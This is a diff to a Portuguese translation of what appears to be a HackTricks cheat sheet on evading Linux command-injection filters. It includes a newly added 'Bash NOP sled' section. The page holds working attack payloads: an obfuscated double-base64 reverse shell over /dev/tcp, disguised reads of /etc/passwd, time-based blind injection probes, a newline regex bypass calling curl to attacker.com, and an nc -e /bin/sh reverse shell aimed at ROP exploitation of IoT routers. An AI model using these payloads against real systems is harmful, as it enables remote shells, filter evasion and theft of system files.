@@ -4,13 +4,13 @@
 
 ## Bypasses de Limitações Comuns
 
-### Shell Reversa
+### Reverse Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Rev shell curto
+### Shell Rev curta
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -105,7 +105,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass backslash e slash
+### Bypass backslash and slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -133,19 +133,19 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Obtendo caracteres de Variáveis de Ambiente
+### Obtendo caracteres de variáveis de ambiente
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
 ### Exfiltração de dados DNS
 
-Você pode usar **burpcollab** ou [**pingb**](http://pingb.in) por exemplo.
+Você pode usar **burpcollab** ou [**pingb**](http://pingb.in) como exemplo.
 
 ### Builtins
 
-Caso você não consiga executar funções externas e tenha apenas acesso a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazer isso. Normalmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar contornar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
-Primeiro, verifique todos os [**builtins do shell**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Então aqui estão algumas **recomendações**:
+Caso você não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de builtins para obter RCE**, existem alguns truques úteis para fazê-lo. Normalmente, você **não poderá usar todos** os **builtins**, então você deve **conhecer todas as suas opções** para tentar contornar a prisão. Ideia de [**devploit**](https://twitter.com/devploit).\
+Primeiro, verifique todos os [**builtins do shell**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Aqui estão algumas **recomendações**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass potencial de regexes
+### Bypass potencial regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -308,11 +308,33 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
+## NOP Sled Baseado em Espaço ("Bashsledding")
+
+Quando uma vulnerabilidade permite que você controle parcialmente um argumento que, em última instância, chega a `system()` ou outro shell, você pode não saber o deslocamento exato em que a execução começa a ler sua carga útil. Sleds NOP tradicionais (por exemplo, `\x90`) **não** funcionam na sintaxe do shell, mas o Bash ignorará inofensivamente espaços em branco à frente antes de executar um comando.
+
+Portanto, você pode criar um *NOP sled para Bash* prefixando seu comando real com uma longa sequência de espaços ou caracteres de tabulação:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Se uma cadeia ROP (ou qualquer primitiva de corrupção de memória) pousar o ponteiro de instrução em qualquer lugar dentro do bloco de espaço, o parser do Bash simplesmente ignora os espaços em branco até alcançar `nc`, executando seu comando de forma confiável.
+
+Casos de uso práticos:
+
+1. **Blobs de configuração mapeados na memória** (por exemplo, NVRAM) que são acessíveis entre processos.
+2. Situações em que o atacante não pode escrever bytes NULL para alinhar a carga útil.
+3. Dispositivos embarcados onde apenas `ash`/`sh` do BusyBox está disponível – eles também ignoram espaços em branco à frente.
+
+> 🛠️  Combine esse truque com gadgets ROP que chamam `system()` para aumentar dramaticamente a confiabilidade da exploração em roteadores IoT com restrições de memória.
+
 ## Referências & Mais
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
